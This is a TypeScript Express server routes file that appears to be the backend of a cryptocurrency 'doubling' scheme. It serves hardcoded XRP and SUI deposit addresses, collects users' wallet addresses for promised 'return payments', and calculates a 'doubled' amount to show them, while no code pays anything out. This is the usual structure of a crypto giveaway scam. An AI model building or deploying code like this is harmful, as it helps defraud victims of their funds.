import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { walletSchema } from "@shared/schema";
import { z } from "zod";

export async function registerRoutes(app: Express): Promise<Server> {
  // API endpoints for crypto doubling service
  app.get('/api/wallet-addresses', (req, res) => {
    res.json({
      xrp: "rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh",
      sui: "0x5c1e88b39e6374a6a246332afc02d3d7c521fc31"
    });
  });

  // Submit wallet address for return payments
  app.post('/api/submit-wallet', async (req, res) => {
    try {
      const data = walletSchema.parse(req.body);
      const result = await storage.saveWalletAddress(data);
      res.json({ success: true, data: result });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ 
          success: false, 
          message: "Invalid wallet data", 
          errors: error.errors 
        });
      } else {
        res.status(500).json({ success: false, message: "Server error" });
      }
    }
  });

  // Calculate doubling returns
  app.post('/api/calculate', (req, res) => {
    try {
      const schema = z.object({
        amount: z.number().positive(),
        cryptoType: z.enum(['xrp', 'sui'])
      });
      
      const { amount, cryptoType } = schema.parse(req.body);
      const doubledAmount = amount * 2;
      
      res.json({
        originalAmount: amount,
        doubledAmount,
        cryptoType
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({ 
          success: false, 
          message: "Invalid calculation data", 
          errors: error.errors 
        });
      } else {
        res.status(500).json({ success: false, message: "Server error" });
      }
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
